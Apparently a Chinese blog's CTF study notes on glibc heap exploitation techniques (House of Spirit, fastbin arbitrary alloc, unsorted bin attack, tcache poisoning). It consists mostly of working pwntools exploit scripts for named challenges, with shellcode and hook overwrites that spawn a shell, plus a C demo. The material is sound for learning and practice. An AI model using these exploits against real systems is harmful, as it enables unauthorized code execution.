<h1 id="fastbin-attack中的House-of-Spirit"><a href="#fastbin-attack中的House-of-Spirit" class="headerlink" title="fastbin_attack中的House of Spirit"></a>fastbin_attack中的House of Spirit</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>1伪造堆块<br>2覆盖堆指针指向上一步伪造的堆块<br>3释放堆块，将伪造的堆块放入fastbin的单链表里面（需要绕过检测）<br>4申请堆块，将刚才释放的堆块申请出来，最终可以使得向目标区域中写入数据，以达到控制内存的目的。</p>
<h2 id="典例-2"><a href="#典例-2" class="headerlink" title="典例"></a>典例</h2><p>lctf2016_pwn200 <a href="https://gitee.com/LightInfection/ctf/tree/master">https://gitee.com/LightInfection/ctf/tree/master</a></p>
<p>exp</p>
<p>在开始的money之后的输入存在栈溢出，而且没有’\x00’截断puts的时候就可以带出rbp</p>
<p>我们到时候利用栈溢出把rbp的位置改成fake_chunk的位置，接着利用fake chunk控制rip最后退出程序就可以执行shellcode</p>
<p>非常好的一道堆栈结合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&#x27;127.0.0.1&#x27;, 6666)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *0x400991&quot;)</span></span><br><span class="line"></span><br><span class="line">    data = shellcode.ljust(<span class="number">46</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    data += <span class="string">&#x27;bb&#x27;</span></span><br><span class="line">    p.send(data)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">    rbp_addr = p.recvuntil(<span class="string">&#x27;, w&#x27;</span>)[:-<span class="number">3</span>]</span><br><span class="line">    rbp_addr = u64(rbp_addr.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(rbp_addr)</span><br><span class="line"></span><br><span class="line">    fake_addr = rbp_addr - <span class="number">0x90</span></span><br><span class="line">    shellcode_addr = rbp_addr - <span class="number">0x50</span></span><br><span class="line">    <span class="comment"># 输入id伪造下一个堆块的size</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id ~~?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;money~&#x27;</span>)</span><br><span class="line">    data = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x41</span>) <span class="comment"># 伪造堆块的size</span></span><br><span class="line">    data = data.ljust(<span class="number">0x38</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(fake_addr) <span class="comment"># 覆盖堆指针</span></span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>) <span class="comment"># 释放伪堆块进入fastbin</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;long?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n48\n&#x27;</span>) <span class="comment"># 将伪堆块申请出来</span></span><br><span class="line">    data = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(shellcode_addr) <span class="comment"># 将eip修改为shellcode的地址</span></span><br><span class="line">    data = data.ljust(<span class="number">48</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>) <span class="comment"># 退出返回时回去执行shellcode</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="fastbin-attack中的Alloc-to-Stack"><a href="#fastbin-attack中的Alloc-to-Stack" class="headerlink" title="fastbin_attack中的Alloc to Stack"></a>fastbin_attack中的Alloc to Stack</h1><p>参考资料：<a href="https://wiki.x10sec.org/pwn/heap/fastbin_attack/#alloc-to-stack">https://wiki.x10sec.org/pwn/heap/fastbin_attack/#alloc-to-stack</a><br><a href="https://xz.aliyun.com/t/7490">https://xz.aliyun.com/t/7490</a><br>附件下载：<br>链接: <a href="https://pan.baidu.com/s/1dplP_JkSdl9M7F9sUEDVeQ">https://pan.baidu.com/s/1dplP_JkSdl9M7F9sUEDVeQ</a> 密码: mbht<br>–来自百度网盘超级会员V3的分享</p>
<h1 id="fastbin-attack中的Arbitrary-Alloc"><a href="#fastbin-attack中的Arbitrary-Alloc" class="headerlink" title="fastbin_attack中的Arbitrary Alloc"></a>fastbin_attack中的Arbitrary Alloc</h1><p>参考资料：<br><a href="https://wiki.x10sec.org/pwn/heap/fastbin_attack/#arbitrary-alloc">https://wiki.x10sec.org/pwn/heap/fastbin_attack/#arbitrary-alloc</a><br>附件：<br>链接: <a href="https://pan.baidu.com/s/18qfkOMauvySSfHkSLjIvvQ">https://pan.baidu.com/s/18qfkOMauvySSfHkSLjIvvQ</a> 密码: 911k<br>–来自百度网盘超级会员V3的分享</p>
<h2 id="典例-3"><a href="#典例-3" class="headerlink" title="典例"></a>典例</h2><p>fastbin_attack中的Arbitrary Alloc（例题）</p>
<p>题目来源：0ctf 2017 BabyHeap<br>参考资料：<br><a href="https://blog.csdn.net/qq_36495104/article/details/106202135">https://blog.csdn.net/qq_36495104/article/details/106202135</a> #思路<br>CTF-wiki<br><a href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a> #payload<br><a href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a> #关闭地址随机化</p>
<p>附件：<br>链接: <a href="https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw">https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw</a> 密码: f1i6<br>–来自百度网盘超级会员V3的分享</p>
<p>漏洞在edit存在堆溢出，堆溢出，打fastbin</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(con)))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.send(<span class="built_in">str</span>(con))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#overlap</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak&quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line">base=leak-<span class="number">0x3c4b78</span></span><br><span class="line">sys=base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=base+libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">free=base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">malloc=base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">fill(<span class="number">2</span>,p64(malloc-<span class="number">0x23</span>))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#index4</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#index6</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(base+<span class="number">0x4527a</span>)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line">add(<span class="number">0x255</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin_attack"></a>unsortedbin_attack</h1><p>题目来源：HITCON Training lab14 magic heap<br>附件：<br>链接: <a href="https://pan.baidu.com/s/1xtxgobatE9yWFKkEsL6JLg">https://pan.baidu.com/s/1xtxgobatE9yWFKkEsL6JLg</a> 密码: 44km<br>–来自百度网盘超级会员V3的分享</p>
<p>白给题堆溢出，没开PIE直接打unsortedbin改bk</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_heap</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_heap</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">&quot;1111&quot;</span>)  <span class="comment"># 0 size=0x20=32</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">&quot;2222&quot;</span>)  <span class="comment"># 1 size=0x80=128</span></span><br><span class="line"><span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">&quot;3333&quot;</span>)  <span class="comment"># 2</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">&quot;4444&quot;</span>)  <span class="comment">#trigger unsorted bin attack</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;4869&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Tcache-Attack中的Tcache-Poisoning"><a href="#Tcache-Attack中的Tcache-Poisoning" class="headerlink" title="Tcache Attack中的Tcache Poisoning"></a>Tcache Attack中的Tcache Poisoning</h1><p>tcache poisoning的基本原理是覆盖tcache中的next域为目标地址，通过malloc来控制任意地址。<br>这种攻击方法不需要伪造任何的chunk结构。</p>
<p>demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -g -fno-stack-protector -z execstack -no-pie -z norelro test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">size_t</span> stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;定义了一个变量 stack_var，我们想让程序 malloc 到这里 %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;接下来申请两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk a 在: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk b 在: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free 掉这两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 那个链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们把 %p 的前 %lu 字节（也就是 fd/next 指针）改成 stack_var 的地址：%p&quot;</span>, b, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;然后一次 malloc : %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第二次 malloc: %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finish!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="典例-4"><a href="#典例-4" class="headerlink" title="典例"></a>典例</h2><p>参考资料：<br><a href="https://faraz.faith/2019-10-20-secconctf-2019-one/">https://faraz.faith/2019-10-20-secconctf-2019-one/</a><br><a href="https://github.com/SECCON/SECCON2019_online_CTF">https://github.com/SECCON/SECCON2019_online_CTF</a><br>题目来源：SECCON 2019 Online CTF: one (pwn, heap, glibc-2.27)<br>附件下载：<br>链接:<a href="https://pan.baidu.com/s/1nDee9BZ1RMhl3bfjHPSjsA">https://pan.baidu.com/s/1nDee9BZ1RMhl3bfjHPSjsA</a> 密码: 8qjs<br>–来自百度网盘超级会员V3的分享</p>
<p>题目就一个UAF非常简单，Ubuntu18的2.27版本，double free都不用去改bk上的key，也不用去中间free个别的直接freeok</p>
<p>直接改fd控制unsortedbin泄露libc打free_hook</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">BINARY = <span class="string">&#x27;./one&#x27;</span></span><br><span class="line">HOST, PORT = <span class="string">&#x27;one.chal.seccon.jp&#x27;</span>, <span class="number">18357</span></span><br><span class="line"></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">        <span class="comment">#print &quot;LOCAL PROCESS&quot;</span></span><br><span class="line">        <span class="keyword">return</span> process(BINARY)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#print &quot;REMOTE PROCESS&quot;</span></span><br><span class="line">        <span class="keyword">return</span> remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base_address</span>(<span class="params">proc</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">open</span>(<span class="string">&quot;/proc/&#123;&#125;/maps&quot;</span>.<span class="built_in">format</span>(proc.pid), <span class="string">&#x27;rb&#x27;</span>).readlines()[<span class="number">0</span>].split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">breakpoints</span>):</span></span><br><span class="line">    script = <span class="string">&quot;handle SIGALRM ignore\n&quot;</span></span><br><span class="line">    PIE = get_base_address(p)</span><br><span class="line">    script += <span class="string">&quot;set $_base = 0x&#123;:x&#125;\n&quot;</span>.<span class="built_in">format</span>(PIE)</span><br><span class="line">    <span class="keyword">for</span> bp <span class="keyword">in</span> breakpoints:</span><br><span class="line">        script += <span class="string">&quot;b *0x%x\n&quot;</span>%(PIE+bp)</span><br><span class="line">    gdb.attach(p,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;new-window&#x27;]</span></span><br><span class="line"></span><br><span class="line">p = start()</span><br><span class="line"><span class="keyword">if</span> args.GDB:</span><br><span class="line">    debug([])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------- Heap Leak ------------</span></span><br><span class="line"><span class="comment"># Prepare</span></span><br><span class="line">add(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x3e</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We do four frees to set the 0x40 tcache bin count to 4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    free()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment"># Leak the fourth chunk&#x27;s address on the heap</span></span><br><span class="line">show()</span><br><span class="line">heap_leak = u64(p.recvline().strip(<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;Heap leak: &#x27;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------- Libc Leak ------------</span></span><br><span class="line"><span class="comment"># Empty the 0x40 tcache bin first</span></span><br><span class="line">add(p64(<span class="number">0</span>) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>) <span class="comment"># Set FD to null here</span></span><br><span class="line">add(<span class="string">&#x27;A&#x27;</span>*<span class="number">8</span>) <span class="comment"># 0x40 tcache bin now empty</span></span><br><span class="line"><span class="comment"># Note that after the above, the 0x40 tcache bin will have count = 2</span></span><br><span class="line"><span class="comment"># Create four chunks to prep for libc leak</span></span><br><span class="line"><span class="comment"># Make all of them have fake chunks in them with PREV_INUSE bits set</span></span><br><span class="line"><span class="comment"># And make all of them have valid FD pointers as well</span></span><br><span class="line">add(p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)+(p64(heap_leak) + p64(<span class="number">0</span>)) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(p64(<span class="number">0</span>)*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment"># Double free the last chunk</span></span><br><span class="line">free() <span class="comment"># count = 3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">free() <span class="comment"># count = 4</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set FD to one of the fake 0x91 chunks</span></span><br><span class="line">add(p64(heap_leak + <span class="number">0x60</span>)) <span class="comment"># count = 3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;A&#x27;</span>*<span class="number">8</span>) <span class="comment"># count = 2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;A&#x27;</span>*<span class="number">8</span>) <span class="comment"># Got a 0x91 chunk, count = 1</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Free 7 times to fill up tcache bin, 8th one goes into unsorted bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unsorted bin libc leak</span></span><br><span class="line">show()</span><br><span class="line">leak = u64(p.recvline().strip(<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak - <span class="number">0x3ebca0</span> <span class="comment"># Offset found using gdb</span></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;Libc leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">log.info(<span class="string">&#x27;Libc base: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">log.info(<span class="string">&#x27;__free_hook: &#x27;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.info(<span class="string">&#x27;system: &#x27;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tcache poisoning attack to overwrite __free_hook with system</span></span><br><span class="line">add(<span class="string">&#x27;A&#x27;</span>*<span class="number">8</span>) <span class="comment"># count = 0</span></span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite __free_hook with system</span></span><br><span class="line">add(p64(free_hook))</span><br><span class="line">add(p64(free_hook))</span><br><span class="line"><span class="comment">#add(p64(system))</span></span><br><span class="line">one_gadget=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">payload=one_gadget[<span class="number">1</span>]+libc.address</span><br><span class="line">add(p64(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Call system(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"><span class="comment">#add(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

